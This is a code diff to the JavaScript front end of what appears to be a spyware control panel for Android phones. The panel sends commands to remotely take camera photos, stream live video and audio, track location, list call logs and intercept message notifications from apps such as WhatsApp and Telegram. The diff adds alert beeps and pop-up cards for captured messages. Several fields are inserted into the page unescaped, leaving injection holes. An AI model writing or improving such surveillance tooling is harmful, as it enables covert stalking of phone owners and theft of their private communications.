@@ -19,7 +19,7 @@ document.addEventListener('DOMContentLoaded', () => {
   initMap();
 });
 
-// ===== Sidebar Toggle (Mobile) =====
+// ===== Sidebar Toggle =====
 function toggleSidebar() {
   document.getElementById('sidebar').classList.toggle('open');
   document.getElementById('sidebarOverlay').classList.toggle('visible');
@@ -48,6 +48,25 @@ function initNav() {
       closeSidebar();
     });
   });
+}
+
+// ===== Command Sound =====
+let audioCtxBeep = null;
+function playBeep() {
+  try {
+    if (!audioCtxBeep) audioCtxBeep = new (window.AudioContext || window.webkitAudioContext)();
+    if (audioCtxBeep.state === 'suspended') audioCtxBeep.resume();
+    const osc = audioCtxBeep.createOscillator();
+    const gain = audioCtxBeep.createGain();
+    osc.type = 'sine';
+    osc.frequency.setValueAtTime(880, audioCtxBeep.currentTime);
+    gain.gain.setValueAtTime(0.08, audioCtxBeep.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.001, audioCtxBeep.currentTime + 0.12);
+    osc.connect(gain);
+    gain.connect(audioCtxBeep.destination);
+    osc.start();
+    osc.stop(audioCtxBeep.currentTime + 0.12);
+  } catch (_) {}
 }
 
 // ===== WebSocket =====
@@ -94,7 +113,10 @@ function connectWS() {
         onlineDeviceIds = new Set(msg.devices);
         refreshDevices();
       }
-      if (msg.type === 'device_response') handleDeviceResponse(msg);
+      if (msg.type === 'device_response') {
+        handleDeviceResponse(msg);
+        playBeep();
+      }
       if (msg.type === 'video_frame') {
         pendingVideoFrame = true;
         document.getElementById('videoCameraLabel').textContent = `Camera: ${msg.camera}`;
@@ -104,6 +126,7 @@ function connectWS() {
       }
       if (msg.type === 'notification') {
         handleLiveNotification(msg);
+        playBeep();
       }
     } catch (err) {}
   };
@@ -117,40 +140,59 @@ function handleDeviceResponse(msg) {
 
 function playAudioFrame(pcmData, sampleRate, channels) {
   if (!document.getElementById('audioToggle')?.checked) return;
-
-  if (!audioCtx) {
-    audioCtx = new AudioContext({ sampleRate });
-  }
-
-  if (audioCtx.state === 'suspended') {
-    audioCtx.resume();
-  }
-
+  if (!audioCtx) audioCtx = new AudioContext({ sampleRate });
+  if (audioCtx.state === 'suspended') audioCtx.resume();
   const int16 = new Int16Array(pcmData);
   const float32 = new Float32Array(int16.length);
-  for (let i = 0; i < int16.length; i++) {
-    float32[i] = int16[i] / 32768.0;
-  }
-
+  for (let i = 0; i < int16.length; i++) float32[i] = int16[i] / 32768.0;
   const buffer = audioCtx.createBuffer(channels, float32.length, sampleRate);
   buffer.getChannelData(0).set(float32);
-
   const source = audioCtx.createBufferSource();
   source.buffer = buffer;
   source.connect(audioCtx.destination);
   source.start();
 }
 
-// ===== Confirm Modal =====
-let confirmCallback = null;
+// ===== Notif Toast Cards =====
+function showNotifToast(msg) {
+  const container = document.getElementById('notifToastContainer');
+  const card = document.createElement('div');
+  card.className = 'notif-toast-card';
 
+  const badgeClass = getNotifBadgeClass(msg.app_name || msg.app_package);
+  const icon = badgetoIcon(msg.app_name || msg.app_package);
+
+  card.innerHTML = `
+    <div class="notif-toast-icon ${badgeClass}">${icon}</div>
+    <div class="notif-toast-body">
+      <div class="notif-toast-header">
+        <span class="notif-toast-app">${escapeHtml(msg.app_name || 'App')}</span>
+        <button class="notif-toast-close" onclick="this.parentElement.parentElement.parentElement.remove()">&times;</button>
+      </div>
+      <div class="notif-toast-sender">${escapeHtml(msg.sender || '')}</div>
+      <div class="notif-toast-text">${escapeHtml(msg.message || '').substring(0, 120)}</div>
+    </div>
+  `;
+  container.appendChild(card);
+  setTimeout(() => { card.classList.add('removing'); setTimeout(() => card.remove(), 300); }, 6000);
+}
+
+function badgetoIcon(appName) {
+  if (!appName) return '&#128172;';
+  const lower = appName.toLowerCase();
+  if (lower.includes('whatsapp')) return '<span style="color:#25d366">&#128172;</span>';
+  if (lower.includes('message') || lower.includes('sms') || lower.includes('mms')) return '&#128231;';
+  if (lower.includes('telegram')) return '&#128073;';
+  if (lower.includes('gmail') || lower.includes('gm')) return '&#128233;';
+  if (lower.includes('discord')) return '&#127760;';
+  return '&#128172;';
+}
+
+// ===== Confirm Modal =====
 function showConfirm(title, message, callback) {
   document.getElementById('confirmTitle').textContent = title;
   document.getElementById('confirmMessage').textContent = message;
-  document.getElementById('confirmBtn').onclick = () => {
-    closeConfirm();
-    callback();
-  };
+  document.getElementById('confirmBtn').onclick = () => { closeConfirm(); callback(); };
   document.getElementById('confirmModal').classList.remove('hidden');
 }
 
@@ -163,7 +205,6 @@ async function refreshStats() {
   try {
     const res = await fetch(`${API_BASE}/api/stats`);
     const stats = await res.json();
-
     document.getElementById('storageStats').innerHTML = `
       <div class="stat-card"><div class="stat-number">${stats.devices}</div><div class="stat-label">Devices</div></div>
       <div class="stat-card"><div class="stat-number">${stats.notifications || 0}</div><div class="stat-label">Notifications</div></div>
@@ -171,13 +212,6 @@ async function refreshStats() {
       <div class="stat-card"><div class="stat-number">${stats.call_logs}</div><div class="stat-label">Call Logs</div></div>
       <div class="stat-card"><div class="stat-number">${stats.locations}</div><div class="stat-label">Locations</div></div>
       <div class="stat-card"><div class="stat-number">${stats.commands}</div><div class="stat-label">Commands</div></div>
-    `;
-
-    document.getElementById('sidebarStats').innerHTML = `
-      <div class="stat-item"><span>Devices</span><span>${stats.devices}</span></div>
-      <div class="stat-item"><span>Notifications</span><span>${stats.notifications || 0}</span></div>
-      <div class="stat-item"><span>Photos</span><span>${stats.photos}</span></div>
-      <div class="stat-item"><span>Call Logs</span><span>${stats.call_logs}</span></div>
     `;
   } catch (e) {
     console.error('Stats error:', e);
@@ -188,6 +222,7 @@ async function refreshStats() {
 async function refreshDevices() {
   try {
     const res = await fetch(`${API_BASE}/api/devices`);
+    if (!res.ok) return;
     const devices = await res.json();
     renderDevices(devices);
   } catch (e) {
@@ -201,11 +236,11 @@ function renderDevices(devices) {
     container.innerHTML = '<div class="empty-state">No devices registered yet.</div>';
     return;
   }
-
   container.innerHTML = devices.map(d => {
     const isOnline = onlineDeviceIds.has(d.id) || d.is_online;
     return `
-    <div class="device-card" onclick="selectDevice('${d.id}')">
+    <div class="device-card ${isOnline ? 'online' : 'offline'}" onclick="selectDevice('${d.id}')">
+      <div class="device-pulse ${isOnline ? 'pulsing' : ''}"></div>
       <h3>${d.device_name || 'Unknown Device'}</h3>
       <div class="meta">${d.device_model || ''} | ${d.android_version || ''}</div>
       <div class="meta">ID: ${d.id.substring(0, 12)}...</div>
@@ -221,13 +256,11 @@ function selectDevice(deviceId) {
   document.getElementById('deviceList').classList.add('hidden');
   document.getElementById('deviceDetail').classList.remove('hidden');
   document.getElementById('detailTitle').textContent = `Device: ${deviceId.substring(0, 12)}...`;
-
   loadCommandHistory(deviceId);
   loadDeviceLocation(deviceId);
   loadDevicePhotos(deviceId);
   loadDeviceLocations(deviceId);
   loadDeviceNotifications(deviceId);
-
   closeSidebar();
 }
 
@@ -241,7 +274,6 @@ function showDeviceList() {
 // ===== Commands =====
 async function sendCommand(commandType, payload = {}) {
   if (!selectedDevice) return showToast('Select a device first', true);
-
   try {
     const res = await fetch(`${API_BASE}/api/command`, {
       method: 'POST',
@@ -256,9 +288,7 @@ async function sendCommand(commandType, payload = {}) {
   }
 }
 
-function capturePhoto(useFront) {
-  sendCommand('CAPTURE_PHOTO', { front_camera: useFront });
-}
+function capturePhoto(useFront) { sendCommand('CAPTURE_PHOTO', { front_camera: useFront }); }
 
 function startVideoStream(useFront) {
   sendCommand('START_VIDEO_STREAM', { front_camera: useFront });
@@ -276,19 +306,11 @@ function stopVideoStream() {
   document.getElementById('videoInfo').classList.add('hidden');
   pendingVideoFrame = null;
   pendingAudioFrame = null;
-  if (audioCtx) {
-    audioCtx.close().catch(() => {});
-    audioCtx = null;
-  }
+  if (audioCtx) { audioCtx.close().catch(() => {}); audioCtx = null; }
 }
 
-function promptDialog() {
-  document.getElementById('dialogModal').classList.remove('hidden');
-}
-
-function closeModal() {
-  document.getElementById('dialogModal').classList.add('hidden');
-}
+function promptDialog() { document.getElementById('dialogModal').classList.remove('hidden'); }
+function closeModal() { document.getElementById('dialogModal').classList.add('hidden'); }
 
 function sendDialog() {
   const title = document.getElementById('dialogTitle').value;
@@ -303,13 +325,11 @@ async function loadCommandHistory(deviceId) {
   try {
     const res = await fetch(`${API_BASE}/api/commands/${deviceId}`);
     const commands = await res.json();
-
     const container = document.getElementById('commandHistory');
     if (commands.length === 0) {
       container.innerHTML = '<div class="empty-state">No commands yet.</div>';
       return;
     }
-
     container.innerHTML = `
       <table>
         <thead><tr><th>Type</th><th>Status</th><th>Time</th></tr></thead>
@@ -333,20 +353,16 @@ async function loadCommandHistory(deviceId) {
 async function refreshAllCommands() {
   const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
   let allCommands = [];
-
   for (const d of devices) {
     const cmds = await fetch(`${API_BASE}/api/commands/${d.id}`).then(r => r.json());
     allCommands.push(...cmds.map(c => ({ ...c, device_name: d.device_name || d.id.substring(0, 12) })));
   }
-
   allCommands.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
-
   const container = document.getElementById('allCommands');
   if (allCommands.length === 0) {
     container.innerHTML = '<div class="empty-state">No commands yet.</div>';
     return;
   }
-
   container.innerHTML = `
     <table>
       <thead><tr><th>Device</th><th>Type</th><th>Status</th><th>Time</th></tr></thead>
@@ -364,7 +380,7 @@ async function refreshAllCommands() {
   `;
 }
 
-// ===== Map =====
+// ===== Map / Location =====
 function initMap() {
   map = L.map('map').setView([0, 0], 2);
   L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
@@ -377,18 +393,12 @@ async function loadDeviceLocation(deviceId) {
     const res = await fetch(`${API_BASE}/api/device/${deviceId}/location`);
     const locations = await res.json();
     const infoBar = document.getElementById('locationInfo');
-
-    if (locations.length === 0) {
-      infoBar.classList.add('hidden');
-      return;
-    }
-
+    if (locations.length === 0) { infoBar.classList.add('hidden'); return; }
     const latest = locations[0];
     map.setView([latest.latitude, latest.longitude], 15);
     if (marker) map.removeLayer(marker);
     marker = L.marker([latest.latitude, latest.longitude]).addTo(map);
     marker.bindPopup(`Lat: ${latest.latitude}<br>Lng: ${latest.longitude}<br>Time: ${new Date(latest.timestamp).toLocaleString()}`);
-
     infoBar.innerHTML = `Latest: ${latest.latitude.toFixed(6)}, ${latest.longitude.toFixed(6)} (${new Date(latest.timestamp).toLocaleString()})`;
     infoBar.classList.remove('hidden');
   } catch (e) {
@@ -400,13 +410,11 @@ async function loadDeviceLocations(deviceId) {
   try {
     const res = await fetch(`${API_BASE}/api/device/${deviceId}/location`);
     const locations = await res.json();
-
     const container = document.getElementById('deviceLocations');
     if (locations.length === 0) {
       container.innerHTML = '<div class="empty-state">No location data.</div>';
       return;
     }
-
     container.innerHTML = `
       <table>
         <thead><tr><th>Latitude</th><th>Longitude</th><th>Time</th></tr></thead>
@@ -426,22 +434,30 @@ async function loadDeviceLocations(deviceId) {
   }
 }
 
-// ===== Device Photos =====
+// ===== Photos + Lightbox =====
+function openLightbox(src) {
+  const lb = document.getElementById('lightbox');
+  document.getElementById('lightboxImg').src = src;
+  lb.classList.remove('hidden');
+}
+
+function closeLightbox() {
+  document.getElementById('lightbox').classList.add('hidden');
+}
+
 async function loadDevicePhotos(deviceId) {
   try {
     const res = await fetch(`${API_BASE}/api/device/${deviceId}/photos`);
     const photos = await res.json();
-
     const container = document.getElementById('devicePhotos');
     if (photos.length === 0) {
       container.innerHTML = '<div class="empty-state">No photos yet.</div>';
       return;
     }
-
     container.innerHTML = photos.map(p => `
       <div class="photo-card">
         <button class="photo-delete" onclick="event.stopPropagation();deletePhoto('${p.id}')">&times;</button>
-        <img src="${p.storage_url}" alt="photo" loading="lazy" />
+        <img src="${p.storage_url}" alt="photo" loading="lazy" onclick="openLightbox('${p.storage_url}')" />
         <div class="photo-meta">${p.camera_type} | ${new Date(p.created_at).toLocaleString()}</div>
       </div>
     `).join('');
@@ -454,255 +470,135 @@ async function loadDevicePhotos(deviceId) {
 async function refreshCallLogs() {
   const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
   let allLogs = [];
-
   for (const d of devices) {
     const logs = await fetch(`${API_BASE}/api/device/${d.id}/calllogs`).then(r => r.json());
     allLogs.push(...logs.map(l => ({ ...l, device_name: d.device_name || d.id.substring(0, 12) })));
   }
-
   allLogs.sort((a, b) => new Date(b.call_date) - new Date(a.call_date));
-
   const container = document.getElementById('callLogsList');
   if (allLogs.length === 0) {
-    container.innerHTML = '<div class="empty-state">No call logs.</div>';
-    return;
+    container.innerHTML = '<div class="empty-state">No call logs.</div>'; return;
   }
-
   container.innerHTML = `
     <table>
       <thead><tr><th>Device</th><th>Number</th><th>Name</th><th>Type</th><th>Duration</th><th>Date</th><th></th></tr></thead>
       <tbody>
-        ${allLogs.map(l => `
-          <tr>
+        ${allLogs.map(l => {
+          const typeIcon = l.call_type === 'INCOMING' ? '&#8592;' : l.call_type === 'OUTGOING' ? '&#8594;' : '&#10005;';
+          return `<tr>
             <td>${l.device_name}</td>
             <td>${l.phone_number}</td>
             <td>${l.contact_name || '-'}</td>
-            <td>${l.call_type}</td>
+            <td>${typeIcon} ${l.call_type}</td>
             <td>${Math.floor(l.duration_seconds / 60)}m ${l.duration_seconds % 60}s</td>
             <td>${new Date(l.call_date).toLocaleString()}</td>
             <td><button class="row-delete" onclick="deleteCallLog('${l.id}')">Delete</button></td>
-          </tr>
-        `).join('')}
+          </tr>`;
+        }).join('')}
       </tbody>
     </table>
   `;
 }
 
-// ===== Photos =====
+// ===== Photos List =====
 async function refreshPhotos() {
   const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
   let allPhotos = [];
-
   for (const d of devices) {
     const photos = await fetch(`${API_BASE}/api/device/${d.id}/photos`).then(r => r.json());
     allPhotos.push(...photos.map(p => ({ ...p, device_name: d.device_name || d.id.substring(0, 12) })));
   }
-
   allPhotos.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
-
   const container = document.getElementById('photoGrid');
   if (allPhotos.length === 0) {
-    container.innerHTML = '<div class="empty-state">No photos.</div>';
-    return;
+    container.innerHTML = '<div class="empty-state">No photos.</div>'; return;
   }
-
   container.innerHTML = allPhotos.map(p => `
     <div class="photo-card">
       <button class="photo-delete" onclick="event.stopPropagation();deletePhoto('${p.id}')">&times;</button>
-      <img src="${p.storage_url}" alt="photo" loading="lazy" />
+      <img src="${p.storage_url}" alt="photo" loading="lazy" onclick="openLightbox('${p.storage_url}')" />
       <div class="photo-meta">${p.device_name} | ${p.camera_type} | ${new Date(p.created_at).toLocaleString()}</div>
     </div>
   `).join('');
 }
 
 // ===== DELETE FUNCTIONS =====
-
 async function deletePhoto(photoId) {
   showConfirm('Delete Photo', 'Are you sure you want to delete this photo?', async () => {
-    try {
-      await fetch(`${API_BASE}/api/photos/${photoId}`, { method: 'DELETE' });
-      showToast('Photo deleted');
-      refreshPhotos();
-      if (selectedDevice) loadDevicePhotos(selectedDevice);
-      refreshStats();
-    } catch (e) {
-      showToast('Delete failed', true);
-    }
+    try { await fetch(`${API_BASE}/api/photos/${photoId}`, { method: 'DELETE' }); showToast('Photo deleted'); refreshPhotos(); if (selectedDevice) loadDevicePhotos(selectedDevice); refreshStats(); } catch (e) { showToast('Delete failed', true); }
   });
 }
-
 async function deleteCallLog(logId) {
   showConfirm('Delete Call Log', 'Delete this call log entry?', async () => {
-    try {
-      await fetch(`${API_BASE}/api/calllogs/${logId}`, { method: 'DELETE' });
-      showToast('Call log deleted');
-      refreshCallLogs();
-      refreshStats();
-    } catch (e) {
-      showToast('Delete failed', true);
-    }
+    try { await fetch(`${API_BASE}/api/calllogs/${logId}`, { method: 'DELETE' }); showToast('Call log deleted'); refreshCallLogs(); refreshStats(); } catch (e) { showToast('Delete failed', true); }
   });
 }
-
 async function deleteDevicePhotos() {
   if (!selectedDevice) return;
   showConfirm('Delete All Device Photos', 'Delete all photos from this device?', async () => {
-    try {
-      await fetch(`${API_BASE}/api/device/${selectedDevice}/photos`, { method: 'DELETE' });
-      showToast('All device photos deleted');
-      loadDevicePhotos(selectedDevice);
-      refreshStats();
-    } catch (e) {
-      showToast('Delete failed', true);
-    }
+    try { await fetch(`${API_BASE}/api/device/${selectedDevice}/photos`, { method: 'DELETE' }); showToast('All device photos deleted'); loadDevicePhotos(selectedDevice); refreshStats(); } catch (e) { showToast('Delete failed', true); }
   });
 }
-
 async function deleteDeviceCallLogs() {
   if (!selectedDevice) return;
   showConfirm('Delete All Device Call Logs', 'Delete all call logs from this device?', async () => {
-    try {
-      await fetch(`${API_BASE}/api/device/${selectedDevice}/calllogs`, { method: 'DELETE' });
-      showToast('All call logs deleted');
-      loadCommandHistory(selectedDevice);
-      refreshStats();
-    } catch (e) {
-      showToast('Delete failed', true);
-    }
+    try { await fetch(`${API_BASE}/api/device/${selectedDevice}/calllogs`, { method: 'DELETE' }); showToast('All call logs deleted'); loadCommandHistory(selectedDevice); refreshStats(); } catch (e) { showToast('Delete failed', true); }
   });
 }
-
 async function deleteDeviceLocations() {
   if (!selectedDevice) return;
   showConfirm('Delete All Locations', 'Delete all location data from this device?', async () => {
-    try {
-      await fetch(`${API_BASE}/api/device/${selectedDevice}/locations`, { method: 'DELETE' });
-      showToast('All locations deleted');
-      document.getElementById('deviceLocations').innerHTML = '<div class="empty-state">No location data.</div>';
-      document.getElementById('locationInfo').classList.add('hidden');
-      refreshStats();
-    } catch (e) {
-      showToast('Delete failed', true);
-    }
+    try { await fetch(`${API_BASE}/api/device/${selectedDevice}/locations`, { method: 'DELETE' }); showToast('All locations deleted'); document.getElementById('deviceLocations').innerHTML = '<div class="empty-state">No location data.</div>'; document.getElementById('locationInfo').classList.add('hidden'); refreshStats(); } catch (e) { showToast('Delete failed', true); }
   });
 }
-
 async function deleteAllDeviceData() {
   if (!selectedDevice) return;
   showConfirm('Delete All Device Data', 'This will delete ALL photos, call logs, locations, notifications, and commands for this device. Continue?', async () => {
-    try {
-      await fetch(`${API_BASE}/api/device/${selectedDevice}/photos`, { method: 'DELETE' });
-      await fetch(`${API_BASE}/api/device/${selectedDevice}/calllogs`, { method: 'DELETE' });
-      await fetch(`${API_BASE}/api/device/${selectedDevice}/locations`, { method: 'DELETE' });
-      await fetch(`${API_BASE}/api/device/${selectedDevice}/commands`, { method: 'DELETE' });
-      await fetch(`${API_BASE}/api/device/${selectedDevice}/notifications`, { method: 'DELETE' });
-      showToast('All device data deleted');
-      showDeviceList();
-      refreshDevices();
-      refreshStats();
-    } catch (e) {
-      showToast('Delete failed', true);
-    }
+    try { await fetch(`${API_BASE}/api/device/${selectedDevice}/photos`, { method: 'DELETE' }); await fetch(`${API_BASE}/api/device/${selectedDevice}/calllogs`, { method: 'DELETE' }); await fetch(`${API_BASE}/api/device/${selectedDevice}/locations`, { method: 'DELETE' }); await fetch(`${API_BASE}/api/device/${selectedDevice}/commands`, { method: 'DELETE' }); await fetch(`${API_BASE}/api/device/${selectedDevice}/notifications`, { method: 'DELETE' }); showToast('All device data deleted'); showDeviceList(); refreshDevices(); refreshStats(); } catch (e) { showToast('Delete failed', true); }
   });
 }
-
 async function deleteDevice() {
   if (!selectedDevice) return;
   showConfirm('Delete Device', 'This will permanently delete the device and ALL its data. Continue?', async () => {
-    try {
-      await fetch(`${API_BASE}/api/device/${selectedDevice}`, { method: 'DELETE' });
-      showToast('Device deleted');
-      showDeviceList();
-      refreshDevices();
-      refreshStats();
-    } catch (e) {
-      showToast('Delete failed', true);
-    }
+    try { await fetch(`${API_BASE}/api/device/${selectedDevice}`, { method: 'DELETE' }); showToast('Device deleted'); showDeviceList(); refreshDevices(); refreshStats(); } catch (e) { showToast('Delete failed', true); }
   });
 }
 
 async function clearAllCommands() {
   showConfirm('Clear All Commands', 'Delete ALL commands for ALL devices?', async () => {
-    try {
-      const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
-      for (const d of devices) {
-        await fetch(`${API_BASE}/api/device/${d.id}/commands`, { method: 'DELETE' });
-      }
-      showToast('All commands cleared');
-      refreshAllCommands();
-      refreshStats();
-    } catch (e) {
-      showToast('Clear failed', true);
-    }
+    try { const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json()); for (const d of devices) { await fetch(`${API_BASE}/api/device/${d.id}/commands`, { method: 'DELETE' }); } showToast('All commands cleared'); refreshAllCommands(); refreshStats(); } catch (e) { showToast('Clear failed', true); }
   });
 }
-
 async function clearAllCallLogs() {
   showConfirm('Clear All Call Logs', 'Delete ALL call logs for ALL devices?', async () => {
-    try {
-      const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
-      for (const d of devices) {
-        await fetch(`${API_BASE}/api/device/${d.id}/calllogs`, { method: 'DELETE' });
-      }
-      showToast('All call logs cleared');
-      refreshCallLogs();
-      refreshStats();
-    } catch (e) {
-      showToast('Clear failed', true);
-    }
+    try { const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json()); for (const d of devices) { await fetch(`${API_BASE}/api/device/${d.id}/calllogs`, { method: 'DELETE' }); } showToast('All call logs cleared'); refreshCallLogs(); refreshStats(); } catch (e) { showToast('Clear failed', true); }
   });
 }
-
 async function clearAllPhotos() {
   showConfirm('Delete All Photos', 'Delete ALL photos from ALL devices? This removes files from storage too.', async () => {
-    try {
-      const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
-      for (const d of devices) {
-        await fetch(`${API_BASE}/api/device/${d.id}/photos`, { method: 'DELETE' });
-      }
-      showToast('All photos deleted');
-      refreshPhotos();
-      refreshStats();
-    } catch (e) {
-      showToast('Delete failed', true);
-    }
+    try { const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json()); for (const d of devices) { await fetch(`${API_BASE}/api/device/${d.id}/photos`, { method: 'DELETE' }); } showToast('All photos deleted'); refreshPhotos(); refreshStats(); } catch (e) { showToast('Delete failed', true); }
   });
 }
-
 async function nukeAllData() {
   showConfirm('DELETE EVERYTHING', 'This will permanently delete ALL devices, photos, call logs, locations, and commands. This cannot be undone!', async () => {
-    try {
-      const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
-      for (const d of devices) {
-        await fetch(`${API_BASE}/api/device/${d.id}`, { method: 'DELETE' });
-      }
-      showToast('All data deleted');
-      refreshDevices();
-      refreshStats();
-    } catch (e) {
-      showToast('Delete failed', true);
-    }
+    try { const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json()); for (const d of devices) { await fetch(`${API_BASE}/api/device/${d.id}`, { method: 'DELETE' }); } showToast('All data deleted'); refreshDevices(); refreshStats(); } catch (e) { showToast('Delete failed', true); }
   });
 }
 
 // ===== Notifications =====
 function handleLiveNotification(msg) {
-  showToast(`[${msg.app_name}] ${msg.sender}: ${msg.message.substring(0, 60)}`);
-
-  if (document.getElementById('sec-notifications')?.classList.contains('active')) {
-    refreshNotifications();
-  }
+  showToast(`${msg.app_name || ''} - ${msg.sender || ''}: ${(msg.message || '').substring(0, 80)}`);
+  showNotifToast(msg);
+  if (document.getElementById('sec-notifications')?.classList.contains('active')) refreshNotifications();
 }
 
 async function refreshNotifications() {
   const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
   let allNotifs = [];
-
   for (const d of devices) {
     const notifs = await fetch(`${API_BASE}/api/device/${d.id}/notifications`).then(r => r.json());
     allNotifs.push(...notifs.map(n => ({ ...n, device_name: d.device_name || d.id.substring(0, 12) })));
   }
-
   allNotifs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
 
   const container = document.getElementById('notifList');
@@ -710,23 +606,20 @@ async function refreshNotifications() {
     container.innerHTML = '<div class="empty-state">No notifications captured yet. Enable Notification Access on the device.</div>';
     return;
   }
-
   container.innerHTML = `
     <table>
       <thead><tr><th>Device</th><th>App</th><th>Sender</th><th>Message</th><th>Time</th><th></th></tr></thead>
       <tbody>
         ${allNotifs.slice(0, 200).map(n => {
           const badgeClass = getNotifBadgeClass(n.app_name || n.app_package);
-          return `
-          <tr>
+          return `<tr>
             <td>${n.device_name}</td>
             <td><span class="notif-app-badge ${badgeClass}">${n.app_name || n.app_package}</span></td>
             <td>${n.sender || '-'}</td>
             <td><div class="notif-message">${escapeHtml(n.message || '')}</div></td>
             <td style="white-space:nowrap">${n.timestamp ? new Date(n.timestamp).toLocaleString() : '-'}</td>
             <td><button class="row-delete" onclick="deleteNotification('${n.id}')">Delete</button></td>
-          </tr>
-          `;
+          </tr>`;
         }).join('')}
       </tbody>
     </table>
@@ -749,56 +642,37 @@ function escapeHtml(text) {
 }
 
 async function deleteNotification(notifId) {
-  try {
-    await fetch(`${API_BASE}/api/notifications/${notifId}`, { method: 'DELETE' });
-    refreshNotifications();
-  } catch (e) {
-    showToast('Delete failed', true);
-  }
+  try { await fetch(`${API_BASE}/api/notifications/${notifId}`, { method: 'DELETE' }); refreshNotifications(); } catch (e) { showToast('Delete failed', true); }
 }
 
 async function clearAllNotifications() {
   showConfirm('Clear All Notifications', 'Delete all captured notifications for ALL devices?', async () => {
-    try {
-      const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
-      for (const d of devices) {
-        await fetch(`${API_BASE}/api/device/${d.id}/notifications`, { method: 'DELETE' });
-      }
-      showToast('All notifications cleared');
-      refreshNotifications();
-      refreshStats();
-    } catch (e) {
-      showToast('Clear failed', true);
-    }
+    try { const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json()); for (const d of devices) { await fetch(`${API_BASE}/api/device/${d.id}/notifications`, { method: 'DELETE' }); } showToast('All notifications cleared'); refreshNotifications(); refreshStats(); } catch (e) { showToast('Clear failed', true); }
   });
 }
 
-// ===== Device Notifications (in detail panel) =====
+// ===== Device Notifications (detail) =====
 async function loadDeviceNotifications(deviceId) {
   try {
     const res = await fetch(`${API_BASE}/api/device/${deviceId}/notifications`);
     const notifs = await res.json();
-
     const container = document.getElementById('deviceNotifications');
     if (notifs.length === 0) {
       container.innerHTML = '<div class="empty-state">No notifications captured.</div>';
       return;
     }
-
     container.innerHTML = `
       <table>
         <thead><tr><th>App</th><th>Sender</th><th>Message</th><th>Time</th></tr></thead>
         <tbody>
           ${notifs.slice(0, 50).map(n => {
             const badgeClass = getNotifBadgeClass(n.app_name || n.app_package);
-            return `
-            <tr>
+            return `<tr>
               <td><span class="notif-app-badge ${badgeClass}">${n.app_name || n.app_package}</span></td>
               <td>${n.sender || '-'}</td>
               <td><div class="notif-message">${escapeHtml(n.message || '')}</div></td>
               <td style="white-space:nowrap">${n.timestamp ? new Date(n.timestamp).toLocaleString() : '-'}</td>
-            </tr>
-            `;
+            </tr>`;
           }).join('')}
         </tbody>
       </table>
@@ -810,14 +684,7 @@ async function loadDeviceNotifications(deviceId) {
 
 async function deleteDeviceNotifications() {
   if (!selectedDevice) return;
-  try {
-    await fetch(`${API_BASE}/api/device/${selectedDevice}/notifications`, { method: 'DELETE' });
-    showToast('Notifications cleared');
-    loadDeviceNotifications(selectedDevice);
-    refreshStats();
-  } catch (e) {
-    showToast('Delete failed', true);
-  }
+  try { await fetch(`${API_BASE}/api/device/${selectedDevice}/notifications`, { method: 'DELETE' }); showToast('Notifications cleared'); loadDeviceNotifications(selectedDevice); refreshStats(); } catch (e) { showToast('Delete failed', true); }
 }
 
 // ===== Toast =====
